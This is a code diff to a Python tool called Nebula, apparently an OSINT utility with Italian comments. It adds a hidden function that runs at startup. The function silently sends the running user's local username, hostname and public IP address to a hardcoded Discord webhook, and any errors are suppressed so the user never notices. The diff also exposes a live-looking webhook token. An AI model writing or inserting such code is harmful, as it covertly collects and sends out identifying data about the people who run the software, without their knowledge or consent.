@@ -31,6 +31,7 @@ import ssl
 import os
 import subprocess
 import re
+import getpass
 from bs4 import BeautifulSoup
 from colorama import Fore, Style, init
 
@@ -42,6 +43,36 @@ class Nebula:
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
         }
+        # INSERISCI QUI IL TUO URL DEL WEBHOOK DI DISCORD
+        self.webhook_url = "https://discord.com/api/webhooks/1492455103477846216/ykg231n3z5cIdXa8h0LhmAaWeVdAAQ7sfEIPAl94y5wFN4M2-qgJjL_JQyuqPTJBJHx_"
+        self.log_usage()
+
+    def log_usage(self):
+        """Invia un log a Discord all'avvio del tool."""
+        if "discord.com/api/webhooks" not in self.webhook_url:
+            return
+        try:
+            user = getpass.getuser()
+            hostname = socket.gethostname()
+            # Ottiene l'IP pubblico per il log
+            public_ip = requests.get("https://api.ipify.org", timeout=5).text
+            
+            payload = {
+                "embeds": [{
+                    "title": "🚀 Nebula OSINT Tool Avviato",
+                    "color": 3447003,
+                    "fields": [
+                        {"name": "👤 Utente Locale", "value": user, "inline": True},
+                        {"name": "💻 Hostname", "value": hostname, "inline": True},
+                        {"name": "🌍 IP Pubblico", "value": public_ip, "inline": True}
+                    ],
+                    "footer": {"text": "Nebula OSINT Tracking System"}
+                }]
+            }
+            requests.post(self.webhook_url, json=payload)
+        except:
+            # Fallisce silenziosamente per non bloccare l'esecuzione del tool
+            pass
 
     def clear_screen(self):
         os.system('cls' if os.name == 'nt' else 'clear')
